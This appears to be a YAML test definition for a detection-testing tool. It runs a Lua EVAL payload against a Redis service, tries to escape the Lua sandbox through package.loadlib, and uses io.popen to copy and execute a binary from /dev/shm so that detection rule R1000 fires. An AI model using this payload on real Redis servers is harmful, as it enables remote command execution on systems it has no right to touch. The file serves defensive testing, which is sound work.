apiVersion: bobctl.k8sstormcenter.io/v1alpha1
kind: AttackSuite
metadata:
  name: redis-attack-07-exec-devshm
  description: "Execute binary from /dev/shm. Triggers R1000."
target:
  service: redis
  namespace: redis
  port: 6379
  protocol: redis
attacks:
  - name: exec-from-devshm
    type: fileless
    redis:
      eval: |
        local io_mod = nil
        pcall(function()
          if type(io) == 'table' and io.popen then io_mod = io end
        end)
        if not io_mod then
          pcall(function()
            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
            if loader then io_mod = loader() end
          end)
        end
        if not io_mod then return 'sandbox_blocked' end
        local f = io_mod.popen('cp /bin/echo /dev/shm/malicious && /dev/shm/malicious pwned 2>&1; rm -f /dev/shm/malicious')
        local out = f:read('*a')
        f:close()
        return 'shm:' .. out
    successIndicators:
      - responseContains: "shm:"
expectedDetections:
  - attackType: fileless
    ruleID: R1000
    ruleName: "Process executed from malicious source"
    containerName: redis
